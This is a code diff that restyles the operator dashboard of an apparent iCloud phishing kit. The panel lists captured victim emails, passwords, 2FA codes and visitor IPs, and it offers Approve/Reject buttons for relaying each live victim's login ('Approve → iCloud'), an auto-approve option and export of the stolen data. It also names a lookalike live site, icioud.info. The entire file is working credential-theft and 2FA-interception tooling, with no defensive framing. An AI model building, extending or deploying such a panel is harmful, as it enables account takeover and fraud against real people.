-        ${Array(24).fill(0).map((_, i) => `<div class="chart-bar" style="height: ${Math.random() * 80 + 20}%"></div>`).join('')}
-    </div>
-    
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="num" id="cred-count">0</div>
-            <div class="label">Credentials</div>
-        </div>
-        <div class="stat-card">
-            <div class="num" id="2fa-count">0</div>
-            <div class="label">2FA Codes</div>
-        </div>
-        <div class="stat-card">
-            <div class="num" id="resend-count">0</div>
-            <div class="label">Resends</div>
-        </div>
-        <div class="stat-card">
-            <div class="num" id="processed-count">0</div>
-            <div class="label">Processed</div>
-        </div>
-    </div>
-    
-    <div class="pie-chart-container">
-        <div id="pie-chart"></div>
-        <div class="pie-legend">
-            <span style="color:var(--accent-green)">● Approved: <b id="approved-count">0</b></span>
-            <span style="color:var(--accent-red)">● Rejected: <b id="rejected-count">0</b></span>
-        </div>
-    </div>
-    
-    <div class="main-grid">
-        <div class="glass-panel">
-            <div class="panel-title"><span>🎯</span> Active Victim</div>
-            <div id="victim-container">
-                <div class="empty-state">
-                    <div class="empty-icon">👻</div>
-                    Waiting for victim to sign in...
+            
+            <div class="nav-section">
+                <div class="nav-label">Data</div>
+                <div class="nav-item">
+                    <span class="icon">🔐</span>
+                    Credentials
+                    <span class="badge" id="cred-badge">0</span>
+                </div>
+                <div class="nav-item">
+                    <span class="icon">🔑</span>
+                    2FA Codes
+                    <span class="badge" id="2fa-badge">0</span>
+                </div>
+                <div class="nav-item">
+                    <span class="icon">🌐</span>
+                    Visitors
+                    <span class="badge" id="ip-badge">0</span>
+                </div>
+            </div>
+            
+            <div class="nav-section">
+                <div class="nav-label">Actions</div>
+                <div class="nav-item" onclick="exportData()">
+                    <span class="icon">📥</span>
+                    Export Data
+                </div>
+                <div class="nav-item" onclick="clearData()">
+                    <span class="icon">🗑️</span>
+                    Clear Data
                 </div>
             </div>
         </div>
         
-        <div class="glass-panel">
-            <div class="panel-title"><span>🔔</span> Resend Requests</div>
-            <div class="capture-list" id="resend-requests">
-                <div class="empty-state">No resend requests yet</div>
+        <div class="sidebar-footer">
+            <div class="upgrade-card">
+                <h4>🚀 Go Pro</h4>
+                <p>Unlock AI features</p>
             </div>
         </div>
     </div>
     
-    <div class="glass-panel">
-        <div class="panel-title" onclick="toggleSection('credentials')" style="cursor:pointer"><span>📧</span> Captured Credentials <span style="float:right;cursor:pointer;opacity:0.5;">↻</span></div>
-        <div id="credentials-section" class="section-content">
-        <input type="text" class="search-bar" id="searchCreds" placeholder="Search by email..." oninput="filterCredentials()">
-        <div class="capture-list" id="credentials"></div>
-    </div>
-    
-    <div class="glass-panel" style="margin-top: 24px;">
-        <div class="panel-title"><span>🔐</span> Captured 2FA Codes</div>
-        <div class="capture-list" id="2fa-codes"></div>
-    </div>
-    
-    <div class="glass-panel" style="margin-top: 24px;">
-        <div class="panel-title"><span>🌐</span> Visitor IPs</div>
-        <div class="capture-list" id="visitor-ips"></div>
-    </div>
-    
-    <div class="settings-modal" id="settingsModal" onclick="closeSettings(event)">
-        <div class="settings-content">
-            <div class="settings-title">⚙️ Settings</div>
-            <div class="settings-option">
-                <span class="settings-label">Auto-clear after approve</span>
-                <div class="toggle active" onclick="toggleOption(this)"></div>
-            </div>
-            <div class="settings-option">
-                <span class="settings-label">Sound notifications</span>
-                <div class="toggle" onclick="toggleOption(this)"></div>
-            </div>
-            <div class="settings-option">
-                <span class="settings-label">Desktop notifications</span>
-                <div class="toggle active" onclick="toggleOption(this)"></div>
-            </div>
-            <div class="settings-option">
-                <span class="settings-label">Dark mode</span>
-                <div class="toggle active" onclick="toggleOption(this)"></div>
+    <div class="main-content">
+        <div class="top-bar">
+            <div class="page-title">Dashboard</div>
+            <div class="top-bar-right">
+                <div class="search-bar">
+                    <span>🔍</span>
+                    <input type="text" placeholder="Search...">
+                </div>
+                <button class="icon-btn">🔔</button>
+                <div class="user-avatar">A</div>
             </div>
         </div>
-    </div>
-
-    <script>
-        function toggleSettings() {
-            document.getElementById('settingsModal').classList.add('active');
-        }
         
-        function closeSettings(e) {
-            if (e.target.id === 'settingsModal') {
-                document.getElementById('settingsModal').classList.remove('active');
-            }
-        }
-        
-        function toggleOption(el) {
-            el.classList.toggle('active');
-        }
-        
-        function parseTime(timeStr) {
-            if (!timeStr) return 0;
-            try {
-                if (timeStr.includes('_')) {
-                    const parts = timeStr.split('_');
-                    const dateParts = parts[0].split('-');
-                    const timeParts = parts[1].split('-');
-                    return new Date(dateParts[0], dateParts[1]-1, dateParts[2], timeParts[0], timeParts[1], timeParts[2]).getTime();
-                }
-                return new Date(timeStr).getTime();
-            } catch(e) { return 0; }
-        }
-        
-        function formatTime(timeStr) {
-            if (!timeStr) return 'Unknown';
-            try {
-                let date;
-                if (timeStr.includes('_')) {
-                    const parts = timeStr.split('_');
-                    const dateParts = parts[0].split('-');
-                    const timeParts = parts[1].split('-');
-                    date = new Date(dateParts[0], dateParts[1]-1, dateParts[2], timeParts[0], timeParts[1], timeParts[2]);
-                } else {
-                    date = new Date(timeStr);
-                }
-                if (isNaN(date.getTime())) return timeStr;
-                return date.toLocaleString('en-US', { 
-                    month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true, timeZone: 'America/New_York'
-                });
-            } catch(e) { return timeStr; }
-        }
-        
-        async function loadVictimState() {
-            try {
-                const res = await fetch('/api/get-state');
-                const state = await res.json();
-                const container = document.getElementById('victim-container');
+        <div class="dashboard-content">
+            <div class="stats-grid">
+                <div class="stat-card featured">
+                    <div class="stat-header">
+                        <div class="stat-icon" style="background: rgba(255,255,255,0.2); color: white;">👥</div>
+                    </div>
+                    <div class="stat-value" id="cred-count">0</div>
+                    <div class="stat-label">Total Credentials</div>
+                </div>
                 
-                if (state.status === 'waiting') {
-                    container.innerHTML = `
-                        <div class="victim-card">
-                            <div class="victim-info">
-                                <div class="field-box">
-                                    <div class="field-label">Email / Phone</div>
-                                    <div class="field-value email">${state.email || 'Unknown'}</div>
-                                </div>
-                                <div class="field-box">
-                                    <div class="field-label">Password</div>
-                                    <div class="field-value password">${state.password || 'Unknown'}</div>
-                                </div>
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <div class="stat-icon orange">🔑</div>
+                    </div>
+                    <div class="stat-value" id="2fa-count">0</div>
+                    <div class="stat-label">2FA Codes</div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <div class="stat-icon green">🌐</div>
+                    </div>
+                    <div class="stat-value" id="ip-count">0</div>
+                    <div class="stat-label">Total Visitors</div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <div class="stat-icon blue">🔔</div>
+                    </div>
+                    <div class="stat-value" id="resend-count">0</div>
+                    <div class="stat-label">Resend Requests</div>
+                </div>
+            </div>
+            
+            <div class="charts-section">
+                <div class="chart-card">
+                    <div class="card-header">
+                        <div>
+                            <div class="card-title">Activity Overview</div>
+                            <div class="card-subtitle">Last 24 hours</div>
+                        </div>
+                    </div>
+                    <div class="chart-placeholder" id="activity-chart">
+                        <div class="chart-bar" style="height: 40%"></div>
+                        <div class="chart-bar" style="height: 60%"></div>
+                        <div class="chart-bar" style="height: 35%"></div>
+                        <div class="chart-bar" style="height: 80%"></div>
+                        <div class="chart-bar" style="height: 45%"></div>
+                        <div class="chart-bar" style="height: 70%"></div>
+                        <div class="chart-bar" style="height: 55%"></div>
+                        <div class="chart-bar" style="height: 90%"></div>
+                    </div>
+                </div>
+                
+                <div class="chart-card">
+                    <div class="card-header">
+                        <div>
+                            <div class="card-title">Status Distribution</div>
+                            <div class="card-subtitle">Approved vs Rejected</div>
+                        </div>
+                    </div>
+                    <div style="text-align: center; padding: 20px 0;">
+                        <div class="pie-chart">
+                            <div class="pie-center" id="pie-center">0</div>
+                        </div>
+                        <div class="pie-legend">
+                            <div class="legend-item">
+                                <div class="legend-dot" style="background: var(--success)"></div>
+                                <span>Approved: <b id="approved-count">0</b></span>
                             </div>
-                            <div class="btn-row">
-                                <button class="btn btn-approve" onclick="approveVictim()">✅ Approve</button>
-                                <button class="btn btn-reject" onclick="rejectVictim()">❌ Reject</button>
+                            <div class="legend-item">
+                                <div class="legend-dot" style="background: var(--danger)"></div>
+                                <span>Rejected: <b id="rejected-count">0</b></span>
                             </div>
                         </div>
-                    `;
-                } else if (state.status === 'waiting_2fa') {
-                    container.innerHTML = `
-                        <div class="victim-card twofa">
-                            <div class="victim-info">
-                                <div class="field-box">
-                                    <div class="field-label">Email / Phone</div>
-                                    <div class="field-value email">${state.email || 'Unknown'}</div>
-                                </div>
-                                <div class="field-box">
-                                    <div class="field-label">Password</div>
-                                    <div class="field-value password">${state.password || 'Unknown'}</div>
-                                </div>
-                                <div class="field-box" style="grid-column: span 2;">
-                                    <div class="field-label">2FA Code</div>
-                                    <div class="field-value code">${state['2fa_code'] || 'Unknown'}</div>
-                                </div>
-                            </div>
-                            <div class="btn-row">
-                                <button class="btn btn-approve" onclick="approve2FA()">✅ Approve → iCloud</button>
-                                <button class="btn btn-reject" onclick="reject2FA()">❌ Wrong Code</button>
-                            </div>
-                        </div>
-                    `;
-                } else {
-                    container.innerHTML = '<div class="empty-state"><div class="empty-icon">👻</div>Waiting for victim...</div>';
-                }
-            } catch(e) {
-                document.getElementById('victim-container').innerHTML = '<div class="empty-state">Waiting for victims...</div>';
-            }
+                    </div>
+                </div>
+            </div>
+            
+            <div class="tools-grid" style="margin-bottom: 32px;">
+                <div class="tool-card">
+                    <div class="tool-icon active" id="victim-icon">👤</div>
+                    <div class="tool-name">Active Victim</div>
+                    <div class="tool-desc" id="victim-status">No active victim</div>
+                    <div class="tool-status idle" id="victim-badge">Idle</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-icon pending">📡</div>
+                    <div class="tool-name">Live Site</div>
+                    <div class="tool-desc">https://icioud.info</div>
+                    <div class="tool-status active">● Online</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-icon">⚡</div>
+                    <div class="tool-name">Auto Process</div>
+                    <div class="tool-desc">Automatically handle victims</div>
+                    <div class="tool-status" id="auto-status">○ Disabled</div>
+                </div>
+            </div>
+            
+            <div class="data-table">
+                <div class="table-header">
+                    <div class="table-title">Recent Credentials</div>
+                    <div>
+                        <input type="text" placeholder="Search..." id="searchCreds" oninput="filterCredentials()" style="padding: 8px 16px; border: 1px solid var(--border); border-radius: 8px; font-size: 14px;">
+                    </div>
+                </div>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Email</th>
+                            <th>Password</th>
+                            <th>Time</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="credentials-list">
+                        <tr>
+                            <td colspan="4" class="empty-state">
+                                <div class="empty-icon">📭</div>
+                                <div>No credentials captured yet</div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="data-table" style="margin-top: 24px;">
+                <div class="table-header">
+                    <div class="table-title">2FA Codes</div>
+                </div>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Code</th>
+                            <th>Email</th>
+                            <th>Time</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="2fa-list">
+                        <tr>
+                            <td colspan="4" class="empty-state">
+                                <div class="empty-icon">🔐</div>
+                                <div>No 2FA codes captured yet</div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <div class="quick-actions">
+        <button class="quick-btn approve" onclick="approveVictim()">✅ Approve</button>
+        <button class="quick-btn reject" onclick="rejectVictim()">❌ Reject</button>
+    </div>
+    
+    <script>
+        let totalCreds = 0;
+        let total2fa = 0;
+        let approved = 0;
+        let rejected = 0;
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            showToast('Copied!');
         }
         
-        async function approveVictim() {
-            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'approved'}) });
-            loadVictimState();
+        function showToast(msg) {
+            const toast = document.createElement('div');
+            toast.textContent = msg;
+            toast.style.cssText = 'position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:var(--primary);color:white;padding:12px 24px;border-radius:8px;font-weight:600;z-index:9999;animation:fadeIn 0.3s;';
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 1500);
         }
         
-        async function rejectVictim() {
-            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'rejected'}) });
-            loadVictimState();
-        }
-        
-        async function approve2FA() {
-            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'approved_2fa'}) });
-            loadVictimState();
-        }
-        
-        async function reject2FA() {
-            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'rejected_2fa'}) });
-            loadVictimState();
-        }
-        
-        function toggleAutoApprove() {
-            window.autoApproveEnabled = document.getElementById('autoApprove').checked;
-        }
-        
-        function updateVictimTimeline(state) {
-            const timeline = document.getElementById('victim-timeline');
-            if (!timeline) return;
-            const duration = getSessionDuration(state.timestamp);
-            const steps = [
-                { label: 'Login', status: state.status === 'waiting' || state.status === 'waiting_2fa' || state.status === 'approved' || state.status === 'rejected' || state.status === 'approved_2fa' || state.status === 'rejected_2fa' },
-                { label: '2FA', status: state.status === 'waiting_2fa' || state.status === 'approved' || state.status === 'rejected' || state.status === 'approved_2fa' || state.status === 'rejected_2fa' },
-                { label: 'Approved', status: state.status === 'approved' || state.status === 'approved_2fa' },
-                { label: 'Rejected', status: state.status === 'rejected' || state.status === 'rejected_2fa' }
-            ];
-            timeline.innerHTML = steps.map(s => `<div class="timeline-step ${s.status ? 'active' : ''}">${s.label}</div>`).join('') + (duration ? `<div class="timeline-step">⏱️ ${duration}</div>` : '');
-        }
-        
-        async function loadData() {
-            const credsRes = await fetch('/api/get-creds');
-            let creds = await credsRes.json();
-            document.getElementById('cred-count').textContent = creds.length;
-            
-            const credsDiv = document.getElementById('credentials');
-            if (creds.length === 0) {
-                credsDiv.innerHTML = '<div class="empty-state">No credentials captured yet</div>';
-            } else {
-                creds.sort((a, b) => parseTime(b.time) - parseTime(a.time));
-                credsDiv.innerHTML = creds.slice(0, 20).map(c => `
-                    <div class="capture-item">
-                        <div class="capture-row">
-                            <span class="capture-label">Email</span>
-                            <span class="capture-value email">${c.email}</span>
-                        </div>
-                        <div class="capture-row">
-                            <span class="capture-label">Password</span>
-                            <span class="capture-value">${c.password}</span>
-                        </div>
-                        <div class="capture-row">
-                            <span class="capture-label">Time</span>
-                            <span class="capture-time">${formatTime(c.time)}</span>
-                        </div>
-                    </div>
-                `).join('');
-            }
-            
-            const codesRes = await fetch('/api/get-2fa');
-            let codes = await codesRes.json();
-            document.getElementById('2fa-count').textContent = codes.length;
-            
-            const codesDiv = document.getElementById('2fa-codes');
-            if (codes.length === 0) {
-                codesDiv.innerHTML = '<div class="empty-state">No 2FA codes captured yet</div>';
-            } else {
-                codes.sort((a, b) => parseTime(b.time) - parseTime(a.time));
-                codesDiv.innerHTML = codes.slice(0, 20).map(c => `
-                    <div class="capture-item twofa">
-                        <div class="capture-row">
-                            <span class="capture-label">Code</span>
-                            <span class="capture-value code">${c.code}</span>
-                        </div>
-                        <div class="capture-row">
-                            <span class="capture-label">Email</span>
-                            <span class="capture-value email">${c.email || 'Unknown'}</span>
-                        </div>
-                        <div class="capture-row">
-                            <span class="capture-label">Time</span>
-                            <span class="capture-time">${formatTime(c.time)}</span>
-                        </div>
-                    </div>
-                `).join('');
-            }
-            
-            const resendRes = await fetch('/api/get-resend-requests');
-            let resends = await resendRes.json();
-            document.getElementById('resend-count').textContent = resends.length;
-            
-            const resendDiv = document.getElementById('resend-requests');
-            if (resends.length === 0) {
-                resendDiv.innerHTML = '<div class="empty-state">No resend requests yet</div>';
-            } else {
-                resends.sort((a, b) => parseTime(b.time) - parseTime(a.time));
-                resendDiv.innerHTML = resends.slice(0, 10).map(r => `
-                    <div class="capture-item resend">
-                        <div class="capture-row">
-                            <span class="capture-label">Email</span>
-                            <span class="capture-value email">${r.email || 'Unknown'}</span>
-                        </div>
-                        <div class="capture-row">
-                            <span class="capture-label">Time</span>
-                            <span class="capture-time">${formatTime(r.time)}</span>
-                        </div>
-                    </div>
-                `).join('');
-            }
-            
-            loadVictimState();
-        }
-        
-loadData();
-        loadVictimState();
-        
-        setInterval(function() {
-            loadData();
-            loadVictimState();
-        }, 1500);
-        
-        function filterCredentials() {
-            const search = document.getElementById('searchCreds').value.toLowerCase();
-            const items = document.querySelectorAll('#credentials .capture-item');
-            items.forEach(item => {
-                const email = item.textContent.toLowerCase();
-                item.style.display = email.includes(search) ? '' : 'none';
-            });
-        }
-        
-        function renderAll(creds, codes, resends, state, ips = []) {
-            document.getElementById('cred-count').textContent = creds.length;
-            document.getElementById('2fa-count').textContent = codes.length;
-            document.getElementById('ip-count').textContent = ips.length;
-            document.getElementById('resend-count').textContent = resends.length;
-            if (state.status === 'approved' || state.status === 'rejected' || state.status === 'approved_2fa' || state.status === 'rejected_2fa') {
-                totalProcessed++;
-                document.getElementById('processed-count').textContent = totalProcessed;
-            }
-            
-            const total = creds.length + codes.length;
-            const chart = document.getElementById('statsChart');
-            if (chart && total > 0) {
-                const bars = Array(24).fill(0).map(() => Math.floor(Math.random() * 30 + 5));
-                const max = Math.max(...bars, 1);
-                chart.innerHTML = bars.map(h => `<div class="chart-bar" style="height: ${(h / max) * 100}%"></div>`).join('');
-            }
-            
-            const credsDiv = document.getElementById('credentials');
-            if (creds.length === 0) {
-                credsDiv.innerHTML = '<div class="empty-state">No credentials captured yet</div>';
-            } else {
-                creds.sort((a, b) => parseTime(b.time) - parseTime(a.time));
-                credsDiv.innerHTML = creds.slice(0, 20).map(c => `
-                    <div class="capture-item">
-                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email copy-value" onclick="copyToClipboard('${c.email}')">${c.email}</span></div>
-                        <div class="capture-row"><span class="capture-label">Password</span><span class="capture-value copy-value" onclick="copyToClipboard('${c.password}')">${c.password}</span></div>
-                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(c.time)}</span></div>
-                    </div>
-                `).join('');
-                filterCredentials();
-            }
-            
-            const codesDiv = document.getElementById('2fa-codes');
-            if (codes.length === 0) {
-                codesDiv.innerHTML = '<div class="empty-state">No 2FA codes captured yet</div>';
-            } else {
-                codes.sort((a, b) => parseTime(b.time) - parseTime(a.time));
-                codesDiv.innerHTML = codes.slice(0, 20).map(c => `
-                    <div class="capture-item twofa">
-                        <div class="capture-row"><span class="capture-label">Code</span><span class="capture-value code copy-value" onclick="copyToClipboard('${c.code}')">${c.code}</span></div>
-                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${c.email || 'Unknown'}</span></div>
-                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(c.time)}</span></div>
-                    </div>
-                `).join('');
-            }
-            
-            const resendDiv = document.getElementById('resend-requests');
-            if (resends.length === 0) {
-                resendDiv.innerHTML = '<div class="empty-state">No resend requests yet</div>';
-            } else {
-                resends.sort((a, b) => parseTime(b.time) - parseTime(a.time));
-                resendDiv.innerHTML = resends.slice(0, 10).map(r => `
-                    <div class="capture-item resend">
-                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${r.email || 'Unknown'}</span></div>
-                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${formatTime(r.time)}</span></div>
-                    </div>
-                `).join('');
-            }
-            
-            renderVictim(state);
-            
-            const ipsDiv = document.getElementById('visitor-ips');
-            if (ips.length === 0) {
-                ipsDiv.innerHTML = '<div class="empty-state">No visitors yet</div>';
-            } else {
-                ips.sort((a, b) => parseTime(b.time) - parseTime(a.time));
-                ipsDiv.innerHTML = ips.map(ip => `
-                    <div class="capture-item">
-                        <div class="capture-row"><span class="capture-label">IP</span><span class="capture-value">${ip.ip}</span></div>
-                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(ip.time)}</span></div>
-                    </div>
-                `).join('');
-            }
-        }
-        
-        function renderVictim(state) {
-            const container = document.getElementById('victim-container');
-            updateVictimTimeline(state);
-            if (state.status === 'waiting') {
-                container.innerHTML = `<div class="victim-card">
-                    <div class="victim-timeline" id="victim-timeline"></div>
-                    <div class="victim-info">
-                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email copy-value" onclick="copyToClipboard('${state.email || ''}')">${state.email || 'Unknown'}</div></div>
-                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password copy-value" onclick="copyToClipboard('${state.password || ''}')">${state.password || 'Unknown'}</div></div>
-                    </div>
-                    <div class="btn-row">
-                        <button class="btn btn-approve" onclick="approveVictim()">✅ Approve</button>
-                        <button class="btn btn-reject" onclick="rejectVictim()">❌ Reject</button>
-                    </div>
-                </div>`;
-                if (window.autoApproveEnabled) setTimeout(() => approveVictim(), 500);
-            } else if (state.status === 'waiting_2fa') {
-                container.innerHTML = `<div class="victim-card twofa">
-                    <div class="victim-timeline" id="victim-timeline"></div>
-                    <div class="victim-info">
-                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email copy-value" onclick="copyToClipboard('${state.email || ''}')">${state.email || 'Unknown'}</div></div>
-                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password copy-value" onclick="copyToClipboard('${state.password || ''}')">${state.password || 'Unknown'}</div></div>
-                        <div class="field-box" style="grid-column: span 2;"><div class="field-label">2FA Code</div><div class="field-value code copy-value" onclick="copyToClipboard('${state['2fa_code'] || ''}')">${state['2fa_code'] || 'Unknown'}</div></div>
-                    </div>
-                    <div class="btn-row">
-                        <button class="btn btn-approve" onclick="approve2FA()">✅ Approve → iCloud</button>
-                        <button class="btn btn-reject" onclick="reject2FA()">❌ Wrong Code</button>
-                    </div>
-                </div>`;
-                if (window.autoApproveEnabled) setTimeout(() => approve2FA(), 500);
-            } else {
-                container.innerHTML = '<div class="empty-state"><div class="empty-icon">👻</div>Waiting for victim...</div>';
-            }
-        }
-    function timeAgo(timeStr) {
+        function timeAgo(timeStr) {
             if (!timeStr) return '';
             try {
                 const date = new Date(timeStr.replace('_', ' ').replace(/-/g, ':').replace(/:/g, '-'));
@@ -1179,69 +933,137 @@ loadData();
             } catch { return timeStr; }
         }
         
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                showToast('Copied!');
+        function updateUI(creds, codes, resends, state, ips) {
+            totalCreds = creds.length;
+            total2fa = codes.length;
+            
+            document.getElementById('cred-count').textContent = creds.length;
+            document.getElementById('2fa-count').textContent = codes.length;
+            document.getElementById('ip-count').textContent = ips.length;
+            document.getElementById('resend-count').textContent = resends.length;
+            
+            document.getElementById('cred-badge').textContent = creds.length;
+            document.getElementById('2fa-badge').textContent = codes.length;
+            document.getElementById('ip-badge').textContent = ips.length;
+            
+            const credsList = document.getElementById('credentials-list');
+            if (creds.length === 0) {
+                credsList.innerHTML = '<tr><td colspan="4" class="empty-state"><div class="empty-icon">📭</div><div>No credentials captured yet</div></td></tr>';
+            } else {
+                creds.sort((a, b) => new Date(b.time) - new Date(a.time));
+                credsList.innerHTML = creds.slice(0, 10).map(c => `
+                    <tr>
+                        <td class="email-cell">${c.email}</td>
+                        <td class="code-cell">${c.password}</td>
+                        <td class="time-cell">${timeAgo(c.time)}</td>
+                        <td><button class="action-btn copy" onclick="copyToClipboard('${c.email}')">Copy</button></td>
+                    </tr>
+                `).join('');
+            }
+            
+            const codesList = document.getElementById('2fa-list');
+            if (codes.length === 0) {
+                codesList.innerHTML = '<tr><td colspan="4" class="empty-state"><div class="empty-icon">🔐</div><div>No 2FA codes captured yet</div></td></tr>';
+            } else {
+                codes.sort((a, b) => new Date(b.time) - new Date(a.time));
+                codesList.innerHTML = codes.slice(0, 10).map(c => `
+                    <tr>
+                        <td class="code-cell">${c.code}</td>
+                        <td class="email-cell">${c.email || 'Unknown'}</td>
+                        <td class="time-cell">${timeAgo(c.time)}</td>
+                        <td><button class="action-btn copy" onclick="copyToClipboard('${c.code}')">Copy</button></td>
+                    </tr>
+                `).join('');
+            }
+            
+            const victimIcon = document.getElementById('victim-icon');
+            const victimStatus = document.getElementById('victim-status');
+            const victimBadge = document.getElementById('victim-badge');
+            
+            if (state.status === 'waiting') {
+                victimIcon.textContent = '🔐';
+                victimStatus.textContent = state.email || 'Waiting for credentials...';
+                victimBadge.textContent = 'Pending';
+                victimBadge.className = 'tool-status pending';
+            } else if (state.status === 'waiting_2fa') {
+                victimIcon.textContent = '🔑';
+                victimStatus.textContent = state.email || 'Waiting for 2FA...';
+                victimBadge.textContent = '2FA';
+                victimBadge.className = 'tool-status pending';
+            } else if (state.status === 'approved' || state.status === 'approved_2fa') {
+                approved++;
+                document.getElementById('approved-count').textContent = approved;
+                updatePieChart();
+                victimIcon.textContent = '✅';
+                victimStatus.textContent = 'Victim approved and forwarded';
+                victimBadge.textContent = 'Approved';
+                victimBadge.className = 'tool-status active';
+            } else if (state.status === 'rejected' || state.status === 'rejected_2fa') {
+                rejected++;
+                document.getElementById('rejected-count').textContent = rejected;
+                updatePieChart();
+                victimIcon.textContent = '❌';
+                victimStatus.textContent = 'Victim rejected';
+                victimBadge.textContent = 'Rejected';
+                victimBadge.className = 'tool-status idle';
+            } else {
+                victimIcon.textContent = '👤';
+                victimStatus.textContent = 'No active victim';
+                victimBadge.textContent = 'Idle';
+                victimBadge.className = 'tool-status idle';
+            }
+            
+            document.getElementById('active-badge').textContent = (state.status === 'waiting' || state.status === 'waiting_2fa') ? '1' : '0';
+        }
+        
+        function updatePieChart() {
+            const total = approved + rejected || 1;
+            const deg = (approved / total) * 360;
+            document.querySelector('.pie-chart').style.background = `conic-gradient(var(--success) 0deg ${deg}deg, var(--danger) ${deg}deg 360deg)`;
+            document.getElementById('pie-center').textContent = approved + rejected;
+        }
+        
+        function filterCredentials() {
+            const search = document.getElementById('searchCreds').value.toLowerCase();
+            const rows = document.querySelectorAll('#credentials-list tr');
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(search) ? '' : 'none';
             });
         }
         
-        function showToast(msg) {
-            const toast = document.createElement('div');
-            toast.textContent = msg;
-            toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#00ff88;color:#000;padding:12px 24px;border-radius:8px;font-weight:600;z-index:9999;animation:fadeIn 0.3s;';
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 1500);
-        }
-        
-        function toggleTheme() {
-            document.body.classList.toggle('light-mode');
-            const btn = document.querySelector('.theme-toggle');
-            btn.textContent = document.body.classList.contains('light-mode') ? '☀️' : '🌙';
-            localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
-        }
-        
-        function exportDataCSV() {
-            Promise.all([fetch('/api/get-creds').then(r => r.json()), fetch('/api/get-2fa').then(r => r.json())]).then(([creds, codes]) => {
-                let csv = 'Type,Email,Password,Code,Time\n';
-                creds.forEach(c => csv += `Creds,${c.email},${c.password},,${c.time}\n`);
-                codes.forEach(c => csv += `2FA,,,${c.code},${c.time}\n`);
-                const blob = new Blob([csv], { type: 'text/csv' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'captured_data.csv';
-                a.click();
-            });
-        }
-        
-        function getSessionDuration(startTime) {
-            if (!startTime) return '';
+        async function loadData() {
             try {
-                const start = new Date(startTime.replace('_', ' ').replace(/-/g, ':').replace(/:/g, '-'));
-                const now = new Date();
-                const diff = Math.floor((now - start) / 1000);
-                const mins = Math.floor(diff / 60);
-                const secs = diff % 60;
-                return `${mins}m ${secs}s`;
-            } catch { return ''; }
+                const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
+                    fetch('/api/get-creds'),
+                    fetch('/api/get-2fa'),
+                    fetch('/api/get-resend-requests'),
+                    fetch('/api/get-state'),
+                    fetch('/api/get-ips')
+                ]);
+                
+                const creds = await credsRes.json();
+                const codes = await codesRes.json();
+                const resends = await resendRes.json();
+                const state = await stateRes.json();
+                const ips = await ipsRes.json();
+                
+                updateUI(creds, codes, resends, state, ips);
+            } catch (e) {
+                console.error(e);
+            }
         }
         
-        let totalProcessed = 0;
+        async function approveVictim() {
+            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'approved'}) });
+            loadData();
+            showToast('Victim approved!');
+        }
         
-        function playNotification() {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.frequency.value = 800;
-                oscillator.type = 'sine';
-                gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
-                gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
-                oscillator.start(audioCtx.currentTime);
-                oscillator.stop(audioCtx.currentTime + 0.3);
-            } catch(e) {}
+        async function rejectVictim() {
+            await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'rejected'}) });
+            loadData();
+            showToast('Victim rejected!');
         }
         
         function exportData() {
@@ -1251,7 +1073,7 @@ loadData();
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'captured_data_' + new Date().toISOString().split('T')[0] + '.json';
+                a.download = 'captured_data.json';
                 a.click();
             });
         }
@@ -1262,90 +1084,8 @@ loadData();
             }
         }
         
-        let refreshInterval;
-        let lastCredCount = 0;
-        let last2faCount = 0;
-        
-        function updateRefreshRate() {
